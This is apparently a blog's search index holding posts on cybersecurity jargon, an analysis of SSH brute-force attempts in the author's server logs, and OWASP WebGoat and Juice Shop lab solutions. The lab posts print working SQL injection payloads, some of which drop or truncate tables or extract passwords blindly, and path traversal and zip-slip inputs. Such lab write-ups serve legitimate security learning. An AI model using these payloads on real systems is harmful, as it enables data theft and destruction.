{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Blog","text":""},{"location":"2023/06/03/cybersecurity-jargon/","title":"Cybersecurity Jargon","text":""},{"location":"2023/06/03/cybersecurity-jargon/#cybersecurity-jargon","title":"Cybersecurity Jargon","text":"<p>I just recently spoke to a pleasant tech recruiter and in the conversation she mentioned that I should take the opportunity to express any tech jargon that I would know related to the position I was interested in. With this, out of curiosity, I decided to make a quick comparison.</p> <p>Logging into ChatGPT, I then queried it for cybersecurity jargon and here were the results:</p> <p>Certainly! Here's a list of cybersecurity jargon along with brief descriptions for each term:</p> <ol> <li> <p>Firewall: A network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules.</p> </li> <li> <p>Malware: Short for malicious software, it refers to any software designed to harm or exploit computer systems, including viruses, worms, ransomware, and spyware.</p> </li> <li> <p>Phishing: A cyber attack where attackers pose as legitimate entities to trick individuals into revealing sensitive information, such as passwords, credit card numbers, or social security numbers.</p> </li> <li> <p>Encryption: The process of converting information into a code to prevent unauthorized access. Encryption ensures that data remains secure even if intercepted or accessed by unauthorized individuals.</p> </li> <li> <p>Intrusion Detection System (IDS): A system that monitors network traffic for suspicious activities or behaviors that may indicate a cyber attack or unauthorized access attempts.</p> </li> <li> <p>Denial-of-Service (DoS) attack: An attack aimed at rendering a computer system, network, or website unavailable by overwhelming it with a flood of illegitimate requests or excessive traffic.</p> </li> <li> <p>Vulnerability: A weakness or flaw in a computer system or software that can be exploited by attackers to gain unauthorized access, execute malicious code, or compromise the system's integrity.</p> </li> <li> <p>Two-Factor Authentication (2FA): A security mechanism that requires users to provide two different types of identification before accessing a system or account, typically combining a password with a unique verification code or biometric factor.</p> </li> <li> <p>Zero-day exploit: A cyber attack that takes advantage of a previously unknown vulnerability in software or hardware before a patch or fix is available.</p> </li> <li> <p>Social Engineering: The use of psychological manipulation techniques to deceive individuals into divulging confidential information or performing actions that may compromise security.</p> </li> <li> <p>Penetration Testing: Also known as ethical hacking, it involves simulating a cyber attack on a computer system or network to identify vulnerabilities and weaknesses in order to enhance security measures.</p> </li> <li> <p>Patch: A software update or fix released by developers to address vulnerabilities, bugs, or other security issues found in software or operating systems.</p> </li> <li> <p>VPN (Virtual Private Network): A secure network connection that allows users to access the internet or a private network securely by encrypting their connection and routing it through a remote server.</p> </li> <li> <p>Brute Force Attack: An automated technique that systematically tries all possible combinations of passwords or encryption keys until the correct one is found.</p> </li> <li> <p>Ransomware: A type of malicious software that encrypts a victim's files or locks their system, demanding a ransom payment in exchange for restoring access.</p> </li> </ol> <p>These are just a few examples of cybersecurity jargon, but the field is vast, and there are many more terms and concepts to explore.</p> <p>Ha! Not that impressive. I mean, they ARE cybersecurity terminololgy, but very basic and very general. Let's try another query:</p> <p>As a web server operator, it is important to be aware of various cybersecurity vulnerabilities that can affect your web server. Here are some specific vulnerabilities to consider:</p> <ol> <li> <p>Server Misconfiguration: Improperly configured web servers can lead to security vulnerabilities, such as open directories, default or weak passwords, unnecessary services or ports left open, or outdated software versions. Regularly review and update server configurations to ensure they align with security best practices.</p> </li> <li> <p>Cross-Site Scripting (XSS): XSS vulnerabilities allow attackers to inject malicious scripts into web pages, potentially leading to unauthorized access, data theft, or session hijacking. Employ input validation and output encoding to prevent XSS attacks.</p> </li> <li> <p>SQL Injection: SQL injection occurs when an attacker is able to insert malicious SQL code into a query, manipulating the database or obtaining unauthorized access to data. Implement proper input validation and parameterized queries to prevent SQL injection attacks.</p> </li> <li> <p>Server-Side Request Forgery (SSRF): SSRF vulnerabilities enable attackers to make requests from the server to internal resources or external systems, potentially bypassing firewalls and accessing sensitive information. Validate and sanitize user-supplied URLs and restrict access to internal resources.</p> </li> <li> <p>Remote File Inclusion (RFI) and Local File Inclusion (LFI): RFI and LFI vulnerabilities allow attackers to include and execute remote or local files on the web server, leading to unauthorized access, data disclosure, or remote code execution. Avoid including user-supplied input in file paths and ensure proper access controls.</p> </li> <li> <p>Denial-of-Service (DoS) Attacks: DoS attacks aim to overwhelm the server's resources, rendering it inaccessible to legitimate users. Implement measures such as rate limiting, traffic filtering, and load balancing to mitigate DoS attacks.</p> </li> <li> <p>Brute Force Attacks: Brute force attacks involve attempting various username and password combinations to gain unauthorized access to the server. Enforce strong password policies, implement account lockouts, and consider multi-factor authentication to protect against brute force attacks.</p> </li> <li> <p>File Upload Vulnerabilities: Insecure file upload functionality can lead to the execution of malicious code on the server or the dissemination of malicious files. Validate file types, restrict file permissions, and consider server-side scanning of uploaded files.</p> </li> <li> <p>Server-side Code Injection: Server-side code injection vulnerabilities occur when untrusted input is executed on the server, allowing attackers to run arbitrary code. Ensure proper input validation and implement whitelisting for input values.</p> </li> <li> <p>Insecure Direct Object References (IDOR): IDOR vulnerabilities arise when internal objects or resources are directly referenced in URLs, allowing attackers to access unauthorized information. Implement access controls and enforce proper authorization checks.</p> </li> </ol> <p>Regularly updating and patching software, conducting security assessments, and following security best practices are crucial to minimize these vulnerabilities and maintain the security of your web server.</p> <p>Much, much better. Still, a bit lacking. Obviously, my ChatGPT skills need improvement, maybe everyone can benefit from brushing up on their 'prompt engineer' skills??</p> <p>The last result did provide a nice gem, number 10 is definitely a term I feel a lot of the general dev community might not be as familiar with and have the necessary awareness.</p> <p>OK, so now I know it's best for me as a n00b prompt engineer (n00b is such an interesting term to me as a former military veteran who came across this a lot in the military and to see how much it is used in the civilian world, did it originate in the military and then cross over? the civilian world and cross into the military? anyways...) to just use the old fashion way and do some manual search from various open source materials available to me (online AND offline). I DO have a bit experience in aggregating data from various open sources.</p> <p>As gleaned from various sources</p>"},{"location":"2023/06/03/cybersecurity-jargon/#terms-from-job-postings","title":"Terms From Job Postings","text":"<p>Thanks to Black Lantern.</p> <p>Knowledge of: XSS, XXE, SQL Injection, Deserialization Attacks, File Inclusion/Path Traversal Attacks, Server-side Request Forgery, Remote Execution Flaws, Server Configuration Flaws and Authentication Flaws</p> <p>OWASP testing methodology</p> <p>Certs: GWAPT, OSCP, OSCE, GPEN</p>"},{"location":"2023/06/03/cybersecurity-jargon/#terms-from-lethal-skills-site","title":"Terms From Lethal Skills site:","text":"<p>deserialization, node vulnerabilities, template injection</p>"},{"location":"2023/06/03/cybersecurity-jargon/#terms-from-the-hacker-playbook-3","title":"Terms From The Hacker Playbook 3:","text":"<p>DNS sinkhole, Time To Detect (TTD), Time To Mitigate (TTM), Tactics Techniques and Procedures (TTPs), Domain Admin (DA), Domain Controller (DC), stegonagraphy, Advanced Persistent Threat (APT), Mitre Att&amp;ck matrix</p> <p>Penetration Testing Execution Standard</p> <p>Study the specific tools and techniques (TTPs) of APTs here. Additional TTPs can be found in the Google sheet as links to Mitre references for each APT.</p> <p>Commercial Off The Shelf (COTS) offensive tools: Metasploit, Cobalt Strike, DNS Cat</p>"},{"location":"2023/06/03/cybersecurity-jargon/#terms-from-other","title":"Terms from Other:","text":"<ul> <li>Remote Access Trojan (RAT)</li> <li>CIA triad (confidentiality, integrity and availability)</li> </ul> <p>This is obviously a work in progress, stay tuned!</p>"},{"location":"2023/05/31/ssh-attacks/","title":"SSH Attacks on My Server","text":""},{"location":"2023/05/31/ssh-attacks/#ssh-attacks-on-my-server","title":"SSH Attacks on My Server","text":"<p>Recently, I was doing some configuration changes to my personal web server that I host as a VM on Digital Ocean. I was having some issues and was going through my logs to do some debugging when I happened to peruse my auth.log. Upon a quick look, I immediately saw that the log was filled with \"Invalid user\" lines...</p> <p>Obviously, this piqued my curiosity and I spent the next hour or so picking through the log and archived logs to see what was going on. It didn't take me long to see that someone(s) was launching multiple brute force dictionary attacks on my open SSH port. Here is some info that I gleaned:</p> <p></p>Checking total Invalid User attempts<pre><code>cat auth.log.1 auth.log.3 auth.log.4 | grep \"Invalid user\" | wc -l 56683\n</code></pre> Better Checking total Invalid User attempts<pre><code>ls auth.log.* | xargs grep \"Invalid user\" | wc -l 56683\n</code></pre> <p>Note</p> <p>Those archived logs span from May 6 until May 31.</p> <p>After changing the ownership of the archived files to make it easier for me to get the data out. I created a file called 'invalid-users.tx'</p> chown and invalid-users.txt<pre><code>sudo touch invalid-users.txt\nsudo chown user:user invalid-users.txt\ncat auth.log.1 auth.log.3 auth.log.4 | grep \"Invalid user\" &gt; invalid-users.txt\n</code></pre> <p>The dictionary file has many default usernames included as indicated by the attempted usernames listed in my log file:</p> <p></p>username --&gt; admin<pre><code>cat invalid-users.txt | grep \" admin \" | wc -l 4492\n</code></pre> username --&gt; postgres<pre><code>cat invalid-users.txt | grep \" postgres \" | wc -l 862\n</code></pre> username --&gt; pi<pre><code>cat invalid-users.txt | grep \" pi \" | wc -l 758\n</code></pre> username --&gt; orangepi<pre><code>cat invalid-users.txt | grep \" orangepi \" | wc -l 266\n</code></pre> uniq usernames<pre><code>cat invalid-users.txt | pcregrep -o1 \"user (.+) from\" | sort | uniq | wc -l\n6330\n</code></pre> <p>Note</p> <p>pcregrep is handy for easily capturing and displaying the groups from the regex install with: </p><pre><code>sudo apt-get install pcregrep\n</code></pre> uniq ips<pre><code>cat invalid-users.txt | pcregrep -o1 \"from (.+) port\" | sort | uniq | wc -l\n3527\n</code></pre>"},{"location":"2023/05/26/web-and-goats-p1/","title":"web and goats part 1","text":""},{"location":"2023/05/26/web-and-goats-p1/#web-goats-part-1","title":"Web Goats Part 1","text":"<p>If you want to learn or practice your cybersecurity skills, especially against the top ten OWASP web vulnerabilities, then the OWASP WebGoat is a great tool. Allowing for you to practice a range of different techniques that would be otherwise be time consuming to set up in a lab setting, such as fuzzing and SQL Injection, WebGoat also provides great insight and guidance.</p> <p>Get the WebGoat Distro</p> <p>Go to the WebGoat Github for the latest distro. Just download it and run it: </p><pre><code>java -jar webgoat.jar\n</code></pre> <p>Default server settings serve the WebGoat on localhost (127.0.0.1) on port 8080. Just open a browser and go to the URL: </p><pre><code>https://localhost:8080/WebGoat\n</code></pre> <p>Warning</p> <p>It's not a good idea to set up WebGoat and provide it access to the WAN/internet and therefore OTHERS to access your WebGoat.</p> <p>Some of the lessons require some kind of proxy and the recommendation is for OWASP ZAP or BurpSuite. In many case, I found that you could just use the browser's dev tools. I used all of the choices, ZAP, Burp and the dev tools. Burp requires that you get a trial license for scanning. ZAP was incredibly handy for fuzzing, albeit in many cases it was just brute force.</p> <p>OK. So, I skipped ahead in the lessons and went straight for the SQL Injection section...</p>"},{"location":"2023/05/26/web-and-goats-p1/#sql-injection","title":"SQL Injection","text":"<p>I find most information on the internet about SQL Injection sorely lacking. It's quite interesting to me that this same example for SQL Injection has been around for a very long time, if I'm not mistaken.</p> <pre><code>' or 1=1;--\n</code></pre> <p>Does this still work on a bunch of servers? I wonder.</p> <p>Anyways, on to the Juice Shop login page. Here I was able to log on as administrator with:</p> <p>User:</p> <pre><code>administrator\\' or 1=1;--\n</code></pre> <p>Pass: test</p> <p>Which logged me in and provided me with the real admin email: admin@juice-sh.op</p>"},{"location":"2023/05/26/web-and-goats-p1/#owasp-webgoat","title":"OWASP WebGoat","text":"<p>WebGoat is one of the best free instructional units for various types of web vulnerabilities that I have come across. The entire app is packaged as a single .jar and is super simple to get running. There are 8 lessons broken down by the types of vulnerabilities you would see in the wild and many of the lessons have several sections each. WebGoat is great for learning!</p> <p>Download and installation instructions</p> <p>OWASP WebGoat main page You can find the latest .jar distribution files at the WebGoat Github page.</p> <p>I also set up WebGoat on the same VM as the Juice Shop. A useful tip for anyone doing the same thing was that the documentation on the website was misleading as I wanted to change the default IP from localhost to 0.0.0.0. On the website it seems to imply that you can change the server address using the following command line argument:</p> <pre><code>java -jar webgoat-app.jar --server.address=0.0.0.0\n</code></pre> <p>And this certainly did not work for me. I have a set up where I have 2 VMs on a local link where the WebGoat would be at 169.254.7.200 and my attacking machine (using Kali) would be at 169.254.7.150.</p> <p>This is what finally worked for me (which I gleaned from the github repo):</p> <pre><code>java -Dserver.address=0.0.0.0 -jar webgoat-app.jar\n</code></pre> FYI WebGoat uses HSQLDB <p>Some interesting functions for HSQLDB: </p><pre><code>char()\nlength()\nsubstr()\n</code></pre> More can be found in the reference and more specifically the system functions.  <p>Some good tips picked up from the lessons in WebGoat:</p> <ul> <li>' or 1=1; TRUNCATE audit_log;--</li> <li>' or '1'='1</li> <li>SQL Injection is more common in PHP, ASP and ColdFusion</li> <li>SQL server exploits can lead to a command shell</li> <li>String concatenation with ' or + or ||</li> <li>Strings without quotes: char(27)</li> <li>SELECT * FROM users WHERE name = '+char(27) OR 1=1</li> <li>use prepared statements help mitigate SQL Injection</li> <li>implement whitelist with ORDER BY</li> <li>Use zip files to overwrite files after upload using path traversal</li> </ul>"},{"location":"2023/05/26/web-and-goats-p1/#blind-sql-injection","title":"Blind SQL Injection","text":"<ul> <li>Involves asking 'database true or false questions' when server provides only generic error responses.</li> <li>Types include: content-based and time-based injections</li> <li>Find out what type of DB as that can provide insight to available system tables</li> </ul> Content-based<pre><code>    https://shop.example.com/?article=4 and 1=1 # (1)!\n</code></pre> <ol> <li>If no error is thrown, then this DB might be susceptible to SQL Injection</li> </ol> Time-based<pre><code>    ' or 1=1; sleep(10);-- // (1)!\n</code></pre> <ol> <li>If there is 10 second delay then this DB might be susceptible</li> </ol>"},{"location":"2023/05/26/web-and-goats-p1/#solutions-intro","title":"Solutions Intro","text":""},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-intro-solution-for-exercise-9","title":"WebGoat SQL (Intro) - Solution for exercise 9:","text":"<p>A classic??</p> <pre><code>' or '1'='1\n</code></pre>"},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-intro-solution-for-exercise-10","title":"WebGoat SQL (Intro) - Solution for exercise 10:","text":"Login_Count:<pre><code>1\n</code></pre> User_id:<pre><code>1 or 1=1 # (1)!\n</code></pre> <ol> <li>These fields expect numbers and therefore no quotes are necessary.</li> </ol>"},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-intro-solution-for-exercise-11","title":"WebGoat SQL (Intro) - Solution for exercise 11:","text":"Employee Name:<pre><code>' or 1=1;--\n</code></pre> <p>or</p> <p></p>Employee Name:<pre><code>Blah\n</code></pre> Authentication TAN:<pre><code>' or '1'='1\n</code></pre>"},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-intro-solution-for-exercise-12","title":"WebGoat SQL (Intro) - Solution for exercise 12:","text":"Employee Name:<pre><code>' or 1=1; UPDATE employees SET salary=100000 WHERE first_name='John'\n</code></pre>"},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-intro-solution-for-exercise-13","title":"WebGoat SQL (Intro) - Solution for exercise 13:","text":"Action contains:<pre><code>' or 1=1; DROP TABLE access_log;--\n</code></pre>"},{"location":"2023/05/26/web-and-goats-p1/#solutions-advanced-where-things-get-interesting","title":"Solutions Advanced -- Where things get interesting","text":""},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-advanced-solution-for-exercise-3","title":"WebGoat SQL (Advanced) - Solution for exercise 3:","text":"Name:<pre><code>Dave' union select userid, user_name, 'name', 'cc', password, cookie, 1 from user_system_data;--\n</code></pre> <p>or</p> Name:<pre><code>Dave'; select * from user_system_data;--\n</code></pre>"},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-advanced-solution-for-exercise-5","title":"WebGoat SQL (Advanced) - Solution for exercise 5:","text":"<p>This one involved blind SQL injection on a login page. After much trials on the login section with the username and pass, I moved on to the registration section and created a new user named 'devon.' After creating the user I then tried creating the same user with:</p> Username:<pre><code>devon' and 1=1;--\n</code></pre> <p>The response was that the user was already created, but this can't be true as the username includes the '1=1' and other special script. This shows that there is a user with this name, which we already knew and that the server used the remaining string as an injection that compared the user name AND 1=1 which returned a hit.</p> <p>Also, you can double check that injection is possible by using the reverse logic:</p> Username:<pre><code>devon' and 1=2;--\n</code></pre> <p>Using this entry, one can create the same user over and over without being warned that the user already exists. This again indicates that the server is using the injection. Devon exists so the left side of AND is TRUE and as 1=2 is FALSE, the boolean logic becomes:</p> <p>true AND false = false</p>"},{"location":"2023/05/26/web-and-goats-p1/#solutions-mitigation","title":"Solutions Mitigation","text":""},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-mitigation-solution-for-exercise-9","title":"WebGoat \u00a0SQL (Mitigation) - Solution for exercise 9:","text":"<p>Here the backend server is removing all spaces. In order to bypass this, we can use multiline comments to replace the spaces:</p> Replace spaces with comments<pre><code>'/*sp*/or/*sp*/'1'='1';select/*sp*/*/*sp*/from/*sp*/user_system_data;--\n</code></pre>"},{"location":"2023/05/26/web-and-goats-p1/#solutions-path-traversal","title":"Solutions Path Traversal","text":""},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-path-traversal-solution-for-exercise-3","title":"WebGoat \u00a0SQL (Path Traversal) - Solution for exercise 3:","text":"<p>Here the app is replacing occurrences of \"../\" to prevent \"dot-dot-slash\" or path traversal. In the following example, the middle is replaced by the app leaving the path traversal nonetheless:</p> Full Name:<pre><code>....//test\n</code></pre>"},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-path-traversal-solution-for-exercise-4","title":"WebGoat \u00a0SQL (Path Traversal) - Solution for exercise 4:","text":"<ul> <li>Open Manual Request Editor using OWASP ZAP.   </li> <li>In the request body change: <pre><code>filename=\"../white-bookshelf.jpg\"\n</code></pre></li> </ul>"},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-path-traversal-solution-for-exercise-5","title":"WebGoat \u00a0SQL (Path Traversal) - Solution for exercise 5:","text":"<p>Open OWASP ZAP and find the GET request that is being sent when the 'Show random cat picture' button is pressed. Modify this request and resend it using the Manual Request Editor. Found the location by first adding just <code>%2e%2e%2f</code> to the GET request and getting 404 error message with current directory. There is a URL encoding tool in ZAP.</p> GET Request<pre><code>GET http://localhost:9000/WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret\n</code></pre>"},{"location":"2023/05/26/web-and-goats-p1/#webgoat-sql-path-traversal-solution-for-exercise-7","title":"WebGoat \u00a0SQL (Path Traversal) - Solution for exercise 7:","text":"Terminal<pre><code>cd /tmp/webgoat125something\ncp /location-of-some/pic.jpg /home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg\nzip goat.zip ../../home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg\n</code></pre> <p>Then, upload the file via the WebGoat upload page.</p>"},{"location":"2023/05/26/web-and-goats-p1/#interesting-sql-injection-queries-i-used-to-get-necessary-info-from-the-db","title":"Interesting SQL Injection queries I used to get necessary info from the DB:","text":"Using EXISTS()<pre><code>' or EXISTS(SELECT * FROM users);\ndevon' and exists(select * from users) and '1'='1\n</code></pre> Using Binary Search<pre><code>Tom' and length(password)&gt;0;--\ntom' AND ascii(substring(password,1,1)) &gt; 60;--\nTom' and length(user)&gt;5;--\nTom' and ascii(substr(user,2,2))=65;--\nTom' and right(email,3)='com\n</code></pre>"},{"location":"2023/06/02/web-and-goats-p2/","title":"web and goats part 2","text":""},{"location":"2023/06/02/web-and-goats-p2/#web-goats-part-2","title":"Web Goats Part 2","text":"<p>Ok, so this is part 2 of the my adventures with WebGoat. Please check out Part 1 if you want to see my solutions for the SQL Injection part of WebGoat. Spoiler alert though, that article covers most of the solutions I came up for the SQL Injection section. I will be going over my solutions for some of the Broken Access Control section of WebGoat here. I like to have a historical document for these exercises as a nice to have for future reference.</p> <p>If you want to learn or practice your cybersecurity skills, especially against the top ten OWASP web vulnerabilities, then the OWASP WebGoat is a great tool. Allowing for you to practice a range of different techniques that would be otherwise be time consuming to set up in a lab setting, such as fuzzing and SQL Injection, WebGoat also provides great insight and guidance.</p> <p>Get the WebGoat Distro</p> <p>Go to the WebGoat Github for the latest distro. Just download it and run it: </p><pre><code>java -jar webgoat.jar\n</code></pre> <p>Default server settings serve the WebGoat on localhost (127.0.0.1) on port 8080. Just open a browser and go to the URL: </p><pre><code>https://localhost:8080/WebGoat\n</code></pre> <p>Warning</p> <p>It's not a good idea to set up WebGoat and provide it access to the WAN/internet and therefore OTHERS to access your WebGoat.</p> <p>Some of the lessons require some kind of proxy and the recommendation is for OWASP ZAP or BurpSuite. In many case, I found that you could just use the browser's dev tools. I used all of the choices, ZAP, Burp and the dev tools. Burp requires that you get a trial license for scanning. ZAP was incredibly handy for fuzzing, albeit in many cases it was just brute force.</p>"},{"location":"2023/06/02/web-and-goats-p2/#broken-access-control","title":"Broken Access Control","text":"<p>I found challenges 2-4 pretty straightforward. Challenge 5 was a bit more involved and for me, involved use of ZAP in order to fuzz the answer.</p> <p>From the previous lessons, it was discovered that in order to obtain your profile data is was necessary to make the following HTTP call:</p> <pre><code>GET http://localhost:8080/WebGoat/IDOR/profile/userid HTTP/1.1\n</code></pre> <p>With userid being your profile id number ascertained in previous challenges. Using ZAP, I decided that I would just fuzz around my profile id (before and after) and see if another user's profile came up:</p> <p></p> <p>Note</p> <p>The fuzzing capability provided in ZAP is pretty cool, but it doesn't seem to provide you with a way to script it to stop on a desired response from the server you are fuzzing.</p>"}]}